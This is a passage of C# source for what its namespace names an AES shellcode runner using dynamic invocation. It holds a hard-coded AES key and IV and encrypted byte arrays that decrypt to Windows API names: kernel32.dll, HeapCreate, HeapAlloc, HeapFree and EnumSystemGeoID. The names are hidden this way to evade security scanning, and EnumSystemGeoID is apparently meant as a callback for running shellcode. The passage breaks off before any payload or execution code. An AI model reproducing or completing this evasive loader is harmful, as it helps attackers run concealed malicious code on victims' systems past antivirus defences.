...
namespace AES_Shellcode_Runner_Dynamic_Invoke_Alternate
{
    class Program
    {

        static string GlobalKey = "ggvrREJLngVxQ6UeROssu+LQT7Wtn/ua/OvvXTydcsc=";
        static string GlobalIV = "ydhlDMtQAeTTVNnnZFDoPA==";

        static byte[] dkernel32_dll_Bytes = new byte[16] { 0x94, 0x46, 0x6C, 0x3C, 0xBD, 0x1F, 0x27, 0x54, 0x34, 0x58, 0xA9, 0xD5, 0x57, 0xAD, 0xC2, 0x50 };
        static string dkernel32_dll = DecryptAESAsString(dkernel32_dll_Bytes, GlobalKey, GlobalIV);

        static byte[] dHeapCreate_Bytes = new byte[16] { 0xCB, 0xF9, 0xDD, 0x77, 0xA1, 0x85, 0xD5, 0x54, 0xFA, 0xA9, 0xB7, 0xF0, 0xB2, 0xCA, 0x78, 0x76 };
        static string dHeapCreate = DecryptAESAsString(dHeapCreate_Bytes, GlobalKey, GlobalIV);

        static byte[] dHeapAlloc_Bytes = new byte[16] { 0x9C, 0x06, 0x9B, 0xCE, 0x13, 0x53, 0x9E, 0x42, 0x94, 0x54, 0xCC, 0xC2, 0xA4, 0x48, 0x03, 0xCE };
        static string dHeapAlloc = DecryptAESAsString(dHeapAlloc_Bytes, GlobalKey, GlobalIV);

        static byte[] dHeapFree_Bytes = new byte[16] { 0xFF, 0x20, 0x31, 0x23, 0x27, 0xCA, 0x93, 0x4B, 0xED, 0x43, 0x96, 0x39, 0x9D, 0xF7, 0x0F, 0xB2 };
        static string dHeapFree = DecryptAESAsString(dHeapFree_Bytes, GlobalKey, GlobalIV);

        static byte[] dEnumSystemGeoID_Bytes = new byte[16] { 0xE0, 0x7A, 0x3A, 0x80, 0xC3, 0xF5, 0x6E, 0xBC, 0x75, 0xA5, 0x76, 0x2C, 0xD9, 0x99, 0xE8, 0x93 };
